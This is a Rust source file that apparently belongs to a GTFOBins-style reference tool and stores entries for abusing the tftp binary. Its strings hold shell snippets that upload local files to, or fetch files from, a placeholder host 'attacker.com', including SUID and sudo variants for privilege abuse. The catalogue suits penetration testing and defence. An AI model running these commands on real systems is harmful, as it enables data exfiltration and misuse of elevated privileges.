pub static BIN_NAME: &'static str = "tftp";
pub static FU_DESC: &'static str = "Send local file to a TFTP server.";
pub static FU_CODE: &'static str = r#"
    
    RHOST=attacker.com
    tftp $RHOST
    put file_to_send
"#;
pub static FD_DESC: &'static str = "Fetch a remote file from a TFTP server.";
pub static FD_CODE: &'static str = r#"
    
    RHOST=attacker.com
    tftp $RHOST
    get file_to_get
"#;
pub static SUID_DESC: &'static str = "Send local file to a TFTP server.";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which tftp) .

    RHOST=attacker.com
    ./tftp $RHOST
    put file_to_send
"#;
pub static SUDO_DESC: &'static str = "Send local file to a TFTP server.";
pub static SUDO_CODE: &'static str = r#"
    
    RHOST=attacker.com
    sudo tftp $RHOST
    put file_to_send
"#;
use crate::code::{Code, Tag};
pub static FU: Code<'static> = Code { 
	title: "FU_CODE",
	code: FU_CODE,
	tag: Tag::FU,
};
pub static FD: Code<'static> = Code { 
	title: "FD_CODE",
	code: FD_CODE,
	tag: Tag::FD,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
